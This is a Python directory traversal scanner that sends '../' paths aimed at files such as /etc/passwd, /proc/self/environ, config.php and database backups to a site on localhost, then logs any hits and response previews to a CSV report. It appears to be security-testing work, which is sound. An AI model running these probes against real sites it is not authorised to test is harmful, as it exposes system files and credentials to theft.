import requests
import random
import csv

def generate_traversal_paths(base_url, depth=6):
    """
    Generate potential directory traversal paths.
    Args:
        base_url (str): The base URL of the target site.
        depth (int): The maximum traversal depth.
    Returns:
        list: A list of generated traversal paths.
    """
    # Generate traversal patterns such as "../", "../../", etc.
    traversal_patterns = ["../" * i for i in range(1, depth + 1)]
    # Common target files often exploited in such attacks
    common_files = [
        "etc/passwd", "windows/win.ini", "var/log/apache2/access.log",
        "proc/self/environ", "boot.ini", "config.php", "db_backup.sql"
    ]
    paths = []
    for pattern in traversal_patterns:
        for file in common_files:
            paths.append(f"{base_url}/{pattern}{file}")
    return paths

def test_traversal(paths):
    """
    Test traversal paths to find potential vulnerabilities.
    Args:
        paths (list): A list of traversal paths to test.
    Returns:
        list: A list of results from the traversal tests.
    """
    results = []
    total_tests = 0

    print("\n--- Executing Directory Traversal Tests ---")
    for path in paths:
        try:
            # Send a GET request to the path
            response = requests.get(path)
            # Mark the test as successful if the status is 200 and there is content
            successful = response.status_code == 200 and len(response.text) > 50
            if successful:
                print(f"Potential Vulnerability: {response.url} - Status: {response.status_code}")
            results.append({
                "url": path,
                "status_code": response.status_code,
                "successful": successful,
                "response_preview": response.text[:100] if successful else None,
                "error": None
            })
            total_tests += 1
        except requests.RequestException as e:
            # Handle request exceptions
            results.append({
                "url": path,
                "status_code": "ERROR",
                "successful": False,
                "response_preview": None,
                "error": str(e)
            })
            total_tests += 1

    print(f"\n--- Total Tests Executed: {total_tests} ---")
    return results

def generate_report(results, output_file):
    """
    Generate a detailed report of the traversal test results in CSV format.
    Args:
        results (list): The results from the traversal tests.
        output_file (str): The path to the output CSV file.
    """
    successful_tests = [result for result in results if result["successful"]]
    failed_tests = [result for result in results if not result["successful"]]

    print("\n--- Test Summary ---")
    print(f"Total Tests: {len(results)}")
    print(f"Successful Tests: {len(successful_tests)}")
    print(f"Failed Tests: {len(failed_tests)}")

    with open(output_file, "w", newline="") as csvfile:
        # Specify the columns for the CSV report
        fieldnames = ["url", "status_code", "successful", "response_preview", "error"]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for result in results:
            writer.writerow(result)

    print(f"Report saved to {output_file}")

# Main Execution
if __name__ == "__main__":
    base_url = "http://localhost:3000"

    # Step 1: Generate traversal paths
    print("\n--- Generating Directory Traversal Paths ---")
    traversal_paths = generate_traversal_paths(base_url, depth=6)
    print(f"Generated {len(traversal_paths)} paths for testing.")

    # Step 2: Test traversal paths
    results = test_traversal(traversal_paths)

    # Step 3: Generate a report
    generate_report(results, "directory_traversal_results.csv")
